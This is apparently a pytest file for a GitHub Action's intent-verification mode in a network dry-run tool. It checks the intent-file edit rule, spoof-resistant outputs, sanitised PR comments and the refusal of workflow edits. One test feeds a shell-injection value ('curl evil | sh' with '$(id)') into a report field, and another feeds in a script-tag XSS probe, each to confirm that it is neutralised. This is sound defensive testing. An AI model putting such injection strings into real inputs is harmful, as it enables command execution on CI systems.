"""The Action's `mode: verify`: the intent rule (a PR that adds or edits the intent file fails unless
allow-intent-edit), the stale-report and output protections, and the PR comment it posts (the
`netdryrun verify --markdown` summary)."""
import json
import os
import re
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

from netdryrun import cli
from netdryrun.verify import report as vreport
from netdryrun.verify import run as vrun
from test_verify_run import git, run_verify
from verify_helpers import add_new_customer_block, base

OLD = "SAFE" + " TO PROCEED"   # 0.3.1's retired pass verdict, split so the retired-string check never trips

ROOT = Path(__file__).parents[1]
ACTION = yaml.safe_load((ROOT / "action.yml").read_text(encoding="utf-8"))
EDITED = "intent edited in this PR: requires a code-owner approval"


def step(name: str) -> dict:
    return next(s for s in ACTION["runs"]["steps"] if s.get("name") == name)


def python_of(name: str) -> str:
    return step(name)["run"].split("<<'EOF'\n", 1)[1].rsplit("\nEOF", 1)[0]


# --- inputs and wiring -------------------------------------------------------------------------------------

def test_verify_inputs_and_defaults():
    inputs = ACTION["inputs"]
    assert inputs["mode"]["default"] == "run"
    assert inputs["intent-file"]["default"] == "netdryrun-intent.yml"
    assert inputs["allow-intent-edit"]["default"] == "false"
    assert "topology" in inputs and "verdict" in ACTION["outputs"]
    assert "code-owner review" in inputs["allow-intent-edit"]["description"]
    assert "CODEOWNERS" in inputs["allow-intent-edit"]["description"]


def test_before_is_the_pr_base_and_after_the_head():
    env = step("Check the intent file")["env"]
    assert env["NDR_BASE"] == "${{ github.event.pull_request.base.sha }}"
    assert env["NDR_HEAD"] == "${{ github.event.pull_request.head.sha }}"
    assert env["NDR_MERGE"] == "${{ github.sha }}"
    assert step("Check the intent file")["if"] == "inputs.mode == 'verify'"
    run = step("Run Netdryrun")
    assert run["env"]["NDR_BASE"] == "${{ steps.intent.outputs.base }}"
    assert run["env"]["NDR_HEAD"] == "${{ steps.intent.outputs.head }}"
    cmd = run["run"]
    assert 'netdryrun verify "$NDR_TOPOLOGY" --before "$NDR_BASE" --after "$NDR_HEAD" --intent "$NDR_INTENT"' in cmd
    assert "--intent-source action" in cmd and "--markdown netdryrun-summary.md" in cmd
    # no --guards: the standing guards are the base commit's netdryrun.yml, never the PR's
    assert "--guards" not in cmd
    # the intent rule runs before anything is installed or booted
    names = [s.get("name") for s in ACTION["runs"]["steps"]]
    assert names.index("Check the intent file") < names.index("Install containerlab") < names.index("Run Netdryrun")


def test_verify_removes_stale_reports_before_anything_is_written():
    for name, cmd in (("Check the intent file", "python - <<'EOF'"), ("Run Netdryrun", "netdryrun verify")):
        run = step(name)["run"]
        # a plain `rm -f <files>`, or 0.3.3's loop over them (which also removes a directory at a report path)
        rm = run.index("for f in ") if "for f in " in run else run.index("rm -f")
        assert rm < run.index(cmd)
        for f in ('"$NDR_JSON"', '"$NDR_JUNIT"', "netdryrun-summary.md", "netdryrun-comment.json"):
            assert f in run[rm:run.index("\n", rm)], (name, f)


def test_the_comment_step_is_shared_by_both_modes():
    c = step("Comment on the pull request")
    assert "mode" not in c["if"] and c["env"]["NDR_SUMMARY"] == "netdryrun-summary.md"
    assert c["env"]["NDR_MODE"] == "${{ inputs.mode }}"   # the header follows the mode (tests/test_action_comment.py)


# --- the intent rule ---------------------------------------------------------------------------------------

@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "repo"
    r.mkdir()
    git(r, "init", "-q")
    (r / "lab").mkdir()
    (r / "lab" / "topology.clab.yml").write_text("name: t\n")
    (r / "netdryrun-intent.yml").write_text("intent: []\n")
    git(r, "add", ".")
    git(r, "commit", "-q", "-m", "base")
    return r


def git_ok(r: Path, *args: str) -> bool:
    return subprocess.run(["git", *args], cwd=r, capture_output=True).returncode == 0


def commit(r: Path, files: dict[str, str]) -> str:
    for name, text in files.items():
        (r / name).write_text(text)
    git(r, "add", ".")
    git(r, "commit", "-q", "-m", "change")
    return git(r, "rev-parse", "HEAD").strip()


def merged(r: Path, base: str, head: str) -> str:
    """GitHub's merge commit for a PR: the head's tree (here the base is an ancestor), parents base and head.
    Fixed dates, so the same merge is the same commit however many times a test asks for it."""
    env = {**os.environ, "GIT_AUTHOR_DATE": "2026-10-28T00:00:00Z", "GIT_COMMITTER_DATE": "2026-10-28T00:00:00Z",
           "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com", "GIT_COMMITTER_NAME": "t",
           "GIT_COMMITTER_EMAIL": "t@example.com"}
    p = subprocess.run(["git", "commit-tree", f"{head}^{{tree}}", "-p", base, "-p", head, "-m", "merge"], cwd=r,
                       env=env, capture_output=True, text=True)
    assert p.returncode == 0, p.stderr
    return p.stdout.strip()


def check_intent(r: Path, base: str, head: str, allow="false", intent="netdryrun-intent.yml", topology="lab/topology.clab.yml",
                 merge=None):
    out = r / "gh-output.txt"
    out.write_text("")
    if merge is None:
        full = re.compile(r"[0-9a-f]{40}")
        known = full.fullmatch(base) and full.fullmatch(head) and git_ok(r, "cat-file", "-e", f"{head}^{{commit}}")
        merge = merged(r, base, head) if known else ("e" * 40 if full.fullmatch(head) else "")
    env = {**os.environ, "NDR_BASE": base, "NDR_HEAD": head, "NDR_MERGE": merge, "NDR_ALLOW_INTENT_EDIT": allow,
           "NDR_INTENT": intent, "NDR_TOPOLOGY": topology, "GITHUB_OUTPUT": str(out)}
    p = subprocess.run([sys.executable, "-c", python_of("Check the intent file")], cwd=r, env=env,
                       capture_output=True, text=True)
    summary = r / "netdryrun-summary.md"
    return p.returncode, p.stdout, out.read_text(), summary.read_text(encoding="utf-8") if summary.exists() else None


def test_a_pr_that_leaves_the_intent_alone_runs(repo):
    b = git(repo, "rev-parse", "HEAD").strip()
    h = commit(repo, {"lab/edge1.conf": "! after\n"})
    code, log, out, summary = check_intent(repo, b, h)
    assert code == 0, log
    assert out == f"base={b}\nhead={merged(repo, b, h)}\n" and summary is None


@pytest.mark.parametrize("how", ["edit", "add"])
def test_a_pr_that_edits_or_adds_the_intent_fails(repo, how):
    if how == "add":
        git(repo, "rm", "-q", "netdryrun-intent.yml")
        git(repo, "commit", "-q", "-m", "no intent yet")
    b = git(repo, "rev-parse", "HEAD").strip()
    h = commit(repo, {"netdryrun-intent.yml": "intent: []\nallow_anywhere: ['0.0.0.0/0']\n"})
    code, log, out, summary = check_intent(repo, b, h)
    assert code == 1 and f"::error title=Netdryrun verify::{EDITED}" in log
    assert EDITED in summary and summary.startswith("### ⚠️ Netdryrun verify: ERROR: NO VERDICT")
    assert "base=" not in out
    # anything but exactly "true" keeps the rule
    for allow in ("True", "yes", "1", ""):
        assert check_intent(repo, b, h, allow=allow)[0] == 1


def test_allow_intent_edit_lets_it_run_with_a_warning(repo):
    b = git(repo, "rev-parse", "HEAD").strip()
    h = commit(repo, {"netdryrun-intent.yml": "intent:\n  - {prefix: 10.101.0.0/24, appears_on: [up1]}\n"})
    code, log, out, _ = check_intent(repo, b, h, allow="true")
    assert code == 0 and "::warning title=Netdryrun verify::intent edited in this PR" in log
    assert out == f"base={b}\nhead={merged(repo, b, h)}\n"


def test_an_intent_in_a_subfolder_and_a_moved_intent(repo):
    (repo / "lab" / "netdryrun-intent.yml").write_text("intent: []\n")
    git(repo, "add", ".")
    git(repo, "commit", "-q", "-m", "intent in lab/")
    b = git(repo, "rev-parse", "HEAD").strip()
    git(repo, "mv", "netdryrun-intent.yml", "other.yml")
    h = commit(repo, {})
    assert check_intent(repo, b, h, intent="lab/netdryrun-intent.yml")[0] == 0
    # renamed away from the input's path: an edit, and the file is gone from the head
    assert EDITED in check_intent(repo, b, h)[1]


@pytest.mark.parametrize("kw,msg", [
    ({"base": "", "head": ""}, "runs on pull_request events"),
    ({"base": "main", "head": "HEAD"}, "runs on pull_request events"),          # only full SHAs
    ({"topology": " "}, "needs the topology input"),
    ({"intent": "missing-intent.yml"}, "the intent file is not in the PR merged into its base"),
])
def test_the_rule_refuses_what_it_cannot_check(repo, kw, msg):
    b = git(repo, "rev-parse", "HEAD").strip()
    h = commit(repo, {"lab/edge1.conf": "! after\n"})
    args = {"base": b, "head": h, **kw}
    code, log, _, summary = check_intent(repo, args.pop("base"), args.pop("head"), **args)
    assert code == 1 and msg in log and msg in summary


def test_an_unknown_commit_is_fetched_or_refused(repo):
    b = git(repo, "rev-parse", "HEAD").strip()
    code, log, _, _ = check_intent(repo, b, "f" * 40)
    assert code == 1 and "cannot fetch commit" in log


# --- outputs: from the report of this run only, sanitised -------------------------------------------------

def read_result(tmp_path, rep, exit_code: str, mode="verify") -> dict:
    (tmp_path / "r.json").write_text(json.dumps(rep) if rep is not None else "")
    out = tmp_path / "out.txt"
    out.write_text("")
    env = {**os.environ, "NDR_JSON": str(tmp_path / "r.json"), "NDR_EXIT": exit_code, "GITHUB_OUTPUT": str(out),
           "NDR_MODE": mode}
    subprocess.run([sys.executable, "-c", python_of("Read result")], env=env, check=True)
    return dict(line.split("=", 1) for line in out.read_text().splitlines())


def verify_report(tmp_path, before, after, intent):
    res, _ = run_verify(tmp_path, before, after, intent_text=intent)
    return json.loads(vreport.to_json(res)), res


def test_verify_outputs(tmp_path):
    rep, res = verify_report(tmp_path / "m", base().snap(), add_new_customer_block(base()).snap(),
                             "intent:\n  - prefix: 10.101.0.0/24\n    appears_on: [edge1, up1, peer1]\n")
    out = read_result(tmp_path, rep, "0")
    assert out == {"status": "matched", "verdict": "INTENT MATCHED", "passed": "1", "failed": "0",
                   "inconclusive_reason": "", "ok": "true"}
    rep, res = verify_report(tmp_path / "f", base().snap(), add_new_customer_block(base()).snap(), "intent: []\n")
    out = read_result(tmp_path, rep, "1")
    assert (out["status"], out["verdict"]) == ("failed", "UNDECLARED CHANGES: DO NOT APPLY")
    assert int(out["failed"]) == len(rep["undeclared"]) > 0


def test_verify_outputs_cannot_be_spoofed(tmp_path):
    rep, _ = verify_report(tmp_path / "m", base().snap(), base().snap(), "intent: []\n")
    assert read_result(tmp_path, rep, "0")["status"] == "no_change"
    # a report committed in the PR claims a match, but this run exited 1 (or 2)
    for code in ("1", "2", ""):
        assert read_result(tmp_path, rep, code) ["status"] == "error"
    # a verdict that doesn't belong to its status, a run report in verify mode, no report at all
    assert read_result(tmp_path, {**rep, "verdict": OLD}, "0")["status"] == "error"
    run_rep = {"status": "passed", "summary": {"passed": 3, "failed": 0}, "inconclusive_reason": None}
    assert read_result(tmp_path, run_rep, "0")["status"] == "error"
    out = read_result(tmp_path, None, "0")
    assert (out["status"], out["verdict"]) == ("error", "ERROR: NO VERDICT")
    # and the other way round: a verify report read in run mode
    assert read_result(tmp_path, rep, "0", mode="run")["status"] == "error"
    assert read_result(tmp_path, run_rep, "0", mode="run") == {"status": "passed", "verdict": "CHECKS PASSED (only what the checks cover)",
                                                               "passed": "3", "failed": "0", "inconclusive_reason": "", "ok": "true"}


def test_verify_inconclusive_reason_cannot_inject_shell(tmp_path):
    rep, _ = verify_report(tmp_path / "m", base().snap(), base().snap(), "intent: []\n")
    rep.update(status="inconclusive", verdict="INCONCLUSIVE",
               inconclusive={"side": "after", "reason": "r1: x\"; curl evil | sh; echo \"$(id)`id`'\nstatus=matched",
                             "moving": [], "advice": "a"})
    out = read_result(tmp_path, rep, "3")
    assert (out["status"], out["verdict"]) == ("inconclusive", "INCONCLUSIVE")
    assert not set(out["inconclusive_reason"]) & set("\"'`$\\\n")


# --- the PR comment: verdict, echoed intent, undeclared items, next diagnostics ------------------------------

def test_markdown_comment(tmp_path):
    _, res = verify_report(tmp_path, base().snap(), add_new_customer_block(base()).snap(), "intent: []\n")
    md = vreport.markdown(res)
    assert md.startswith("### ❌ Netdryrun verify: UNDECLARED CHANGES: DO NOT APPLY\n")
    assert "**Declared intent**" in md and "none: nothing may change" in md
    assert f"**Undeclared changes ({len(res.match.undeclared)})**" in md
    assert md.count("next: `") == min(40, len(res.match.undeclared)) and "docker exec clab-vlab-" in md
    assert "no standing guards ran" in md and "Standing guards:** none ran" in md
    assert OLD not in md and "CHECKS PASSED" not in md


def test_markdown_comment_is_inert(tmp_path):
    res = vreport.VerifyResult(status="error", run_id="x", error="<img src=x> @org/team #12 [link](http://e)")
    res.warnings.append("<script>alert(1)</script> @someone")
    md = vreport.markdown(res)
    assert "<script>" not in md and "@someone" not in md
    assert "```" in md   # the error is in a fenced block


def test_markdown_comment_fits_a_github_comment(tmp_path):
    _, res = verify_report(tmp_path, base().snap(), add_new_customer_block(base()).snap(), "intent: []\n")
    res.warnings.extend(["w" * 2000] * 40)
    assert len(vreport.markdown(res)) <= 65000


@pytest.mark.parametrize("status", list(vreport.VERDICTS))
def test_cli_writes_the_markdown_and_records_the_action_as_intent_source(tmp_path, monkeypatch, status):
    seen = {}

    def fake(*a, **k):
        seen.update(k)
        return vreport.VerifyResult(status=status, run_id="x", error="e" if status == "error" else "")
    monkeypatch.setattr(vrun, "verify", fake)
    md = tmp_path / "s.md"
    code = cli.main(["verify", "t.yml", "--before", "a", "--after", "b", "--intent", "i.yml", "--markdown", str(md),
                     "--intent-source", "action"])
    assert code == vreport.EXIT_CODES[status] and seen["intent_source"] == "action"
    assert md.read_text(encoding="utf-8").startswith(f"### {vreport.MD_HEAD[status]}")
    assert vreport.VERDICTS[status] in vreport.MD_HEAD[status]


def test_cli_intent_source_defaults_to_cli_and_is_a_closed_list(monkeypatch):
    seen = {}
    monkeypatch.setattr(vrun, "verify", lambda *a, **k: seen.update(k) or vreport.VerifyResult(status="no_change"))
    cli.main(["verify", "t.yml", "--before", "a", "--after", "b", "--intent", "i.yml"])
    assert seen["intent_source"] == "cli"
    with pytest.raises(SystemExit):
        cli.main(["verify", "t.yml", "--before", "a", "--after", "b", "--intent", "i.yml", "--intent-source", "mcp"])


def test_cli_markdown_that_cannot_be_written_is_exit_2(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(vrun, "verify", lambda *a, **k: vreport.VerifyResult(status="matched"))
    code = cli.main(["verify", "t.yml", "--before", "a", "--after", "b", "--intent", "i.yml",
                     "--markdown", str(tmp_path / "no" / "such" / "dir" / "s.md")])
    assert code == 2 and "the verdict was INTENT MATCHED" in capsys.readouterr().err


@pytest.mark.parametrize("status,exit_code,green", [
    ("matched", "0", True), ("no_change", "0", True),
    ("failed", "1", False), ("inconclusive", "3", False), ("unhealthy_baseline", "3", False), ("error", "2", False),
    ("matched", "1", False), ("no_change", "", False), ("failed", "0", False),   # report and exit code disagree
])
def test_verify_mode_is_green_only_on_exit_0_and_an_approving_verify_report(status, exit_code, green, tmp_path):
    """main's rule (a green job needs exit 0 AND a passing report) applied to verify mode, where passing is
    INTENT MATCHED or NO BEHAVIOR CHANGE: a status of `matched` must not turn the job red."""
    from test_surfaces_agree import action_job_fails

    snaps = {"matched": (base().snap(), add_new_customer_block(base()).snap(),
                         "intent:\n  - prefix: 10.101.0.0/24\n    appears_on: [edge1, up1, peer1]\n"),
             "no_change": (base().snap(), base().snap(), "intent: []\n"),
             "failed": (base().snap(), add_new_customer_block(base()).snap(), "intent: []\n")}
    if status in snaps:
        rep, _ = verify_report(tmp_path / status, *snaps[status])
    else:
        rep, _ = verify_report(tmp_path / "x", base().snap(), base().snap(), "intent: []\n")
        rep["status"], rep["verdict"] = status, vreport.VERDICTS[status]
    out = read_result(tmp_path, rep, exit_code)
    assert action_job_fails({"run": {"exit_code": exit_code}, "result": out}) is (not green), out
    # a run-mode report never passes in verify mode
    run_rep = {"status": "passed", "summary": {"passed": 1, "failed": 0}}
    out = read_result(tmp_path, run_rep, "0")
    assert out["status"] == "error" and action_job_fails({"run": {"exit_code": "0"}, "result": out})


def test_cold_4_after_is_the_pr_merged_into_the_base_branch_as_it_is_now(repo):
    """Cold review: the Action booted the PR head, never what lands. The base branch moved on after the PR
    branched (it defines a route-map) and the PR applies it: each alone is harmless, together they are the
    change. After must be GitHub's merge commit, before the base branch tip."""
    fork = git(repo, "rev-parse", "HEAD").strip()
    h = commit(repo, {"lab/edge1.conf": "! applies ROUTE-MAP-X\n"})
    git(repo, "checkout", "-q", fork)
    tip = commit(repo, {"lab/policy.conf": "! defines ROUTE-MAP-X\n"})
    (repo / "lab" / "edge1.conf").write_text("! applies ROUTE-MAP-X\n")
    git(repo, "add", ".")
    merge = git(repo, "commit-tree", git(repo, "write-tree").strip(), "-p", tip, "-p", h, "-m", "merge").strip()
    code, log, out, _ = check_intent(repo, fork, h, merge=merge)
    assert code == 0, log
    assert out == f"base={tip}\nhead={merge}\n"
    # a github.sha that is not this PR's merge commit is refused
    code, log, _, _ = check_intent(repo, fork, h, merge=tip)
    assert code == 1 and "is not this pull request's merge commit" in log


def test_verify_passes_its_timeout_and_the_default_is_the_clis():
    """A lab with a slow-booting node (Junos: 4 to 19 minutes) needs a longer --timeout; the Action passes its
    `timeout` input in verify mode, with the CLI's default."""
    import inspect

    assert float(ACTION["inputs"]["timeout"]["default"]) == inspect.signature(vrun.verify).parameters["timeout"].default
    run = step("Run Netdryrun")
    assert run["env"]["NDR_TIMEOUT"] == "${{ inputs.timeout }}"
    assert '--timeout "$NDR_TIMEOUT"' in run["run"].split("netdryrun verify", 1)[1].split("code=$?", 1)[0]


# --- gauntlet 0.4, R7: the PR edits the workflow that runs its own verdict ----------------------------------
# Under pull_request the workflow comes from the merge commit, so a PR that edits it controls the inputs: it can set
# allow-intent-edit: true together with its own intent, or point intent-file or topology elsewhere.

def test_a_pr_that_changes_a_workflow_is_refused_in_mode_verify(repo):
    base = git(repo, "rev-parse", "HEAD").strip()
    (repo / ".github" / "workflows").mkdir(parents=True)
    head = commit(repo, {".github/workflows/verify.yml": "allow-intent-edit: true\n",
                         "netdryrun-intent.yml": "intent: []\nallow_anywhere: ['0.0.0.0/0']\n"})
    rc, out, _, summary = check_intent(repo, base, head, allow="true")
    assert rc == 1 and ".github/workflows/verify.yml" in out and "workflow" in summary


def test_a_workflow_change_alone_is_refused_too(repo):
    base = git(repo, "rev-parse", "HEAD").strip()
    (repo / ".github" / "workflows").mkdir(parents=True)
    head = commit(repo, {".github/workflows/verify.yml": "intent-file: other.yml\n"})
    rc, out, _, _ = check_intent(repo, base, head)
    assert rc == 1 and "separate" in out


def test_cold_2_a_local_composite_action_is_refused_in_mode_verify(repo):
    base = git(repo, "rev-parse", "HEAD").strip()
    (repo / ".github" / "actions" / "ndr").mkdir(parents=True)
    head = commit(repo, {".github/actions/ndr/action.yml": "allow-intent-edit: true\n"})
    rc, out, _, _ = check_intent(repo, base, head)
    assert rc == 1 and ".github/actions/ndr/action.yml" in out
